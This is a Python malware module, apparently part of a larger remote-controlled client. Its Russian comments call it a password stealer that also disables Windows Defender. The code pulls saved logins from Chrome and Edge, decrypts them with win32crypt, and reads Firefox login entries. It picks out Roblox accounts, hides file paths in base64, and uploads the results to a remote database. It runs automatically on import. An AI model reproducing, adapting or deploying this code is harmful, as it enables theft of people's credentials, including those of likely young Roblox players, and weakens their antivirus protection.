# stealer.py – модуль кражи паролей и отключения Defender
import os, sys, sqlite3, shutil, tempfile, json, subprocess, base64, ctypes

def _d(s):
    return base64.b64decode(s).decode()

# Получаем переданные глобальные переменные
db = globals().get('db')
_CLIENT_PATH = globals().get('_CLIENT_PATH')
_USER_ID = globals().get('_USER_ID')
_upload_single = globals().get('_upload_single')
_disable_defender = globals().get('_disable_defender')

# ---- ИЗВЛЕЧЕНИЕ ПАРОЛЕЙ ----
def _extract_chrome():
    passwords = []
    try:
        login_data = os.path.expandvars(_d('JUxPQ0FMQVBQREFUQSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh'))
        if not os.path.isfile(login_data): return passwords
        temp = os.path.join(tempfile.gettempdir(), 'chrome_temp.db')
        shutil.copy2(login_data, temp)
        conn = sqlite3.connect(temp)
        cur = conn.cursor()
        cur.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cur.fetchall():
            url, username, encrypted = row
            try:
                import win32crypt
                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                passwords.append({'url': url, 'username': username, 'password': password})
            except: continue
        conn.close()
        os.remove(temp)
    except: pass
    return passwords

def _extract_edge():
    passwords = []
    try:
        login_data = os.path.expandvars(_d('JUxPQ0FMQVBQREFUQSVcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ=='))
        if not os.path.isfile(login_data): return passwords
        temp = os.path.join(tempfile.gettempdir(), 'edge_temp.db')
        shutil.copy2(login_data, temp)
        conn = sqlite3.connect(temp)
        cur = conn.cursor()
        cur.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cur.fetchall():
            url, username, encrypted = row
            try:
                import win32crypt
                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                passwords.append({'url': url, 'username': username, 'password': password})
            except: continue
        conn.close()
        os.remove(temp)
    except: pass
    return passwords

def _extract_firefox():
    passwords = []
    try:
        import glob
        profiles = glob.glob(os.path.expandvars(_d('JUFQUERBVEElXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1wqLmRlZmF1bHQtcmVsZWFzZQ==')))
        if not profiles:
            profiles = glob.glob(os.path.expandvars(_d('JUFQUERBVEElXE1vemlsbGFcRmlyZWZveFxQcm9maWxlc1wqLmRlZmF1bHQ=')))
        for profile in profiles:
            login_file = os.path.join(profile, 'logins.json')
            if os.path.isfile(login_file):
                with open(login_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                for entry in data.get('logins', []):
                    passwords.append({'url': entry.get('hostname', ''), 'username': entry.get('usernameField', ''), 'password': '[encrypted]'})
    except: pass
    return passwords

def _extract_roblox():
    all_p = _extract_chrome() + _extract_edge() + _extract_firefox()
    return [x for x in all_p if 'roblox' in x.get('url', '').lower()]

# ---- ГЛАВНАЯ ФУНКЦИЯ ----
def main():
    try:
        # Отключаем Defender ещё раз на всякий случай
        if _disable_defender:
            def_status = _disable_defender()
            db.child(_CLIENT_PATH).update({'defender_status': def_status})

        all_p = _extract_chrome() + _extract_edge() + _extract_firefox()
        if all_p:
            db.child(_CLIENT_PATH).update({'passwords': json.dumps(all_p[:100])})
            roblox = _extract_roblox()
            if roblox:
                db.child(_CLIENT_PATH).update({'roblox_passwords': json.dumps(roblox[:50])})
            else:
                db.child(_CLIENT_PATH).update({'roblox_passwords': '[]'})
        else:
            db.child(_CLIENT_PATH).update({'passwords': '[]', 'roblox_passwords': '[]'})
        db.child(_CLIENT_PATH).update({'stealer_status': 'finished'})
    except Exception as e:
        db.child(_CLIENT_PATH).update({'stealer_error': str(e)})

if __name__ == '__main__':
    main()
else:
    main()
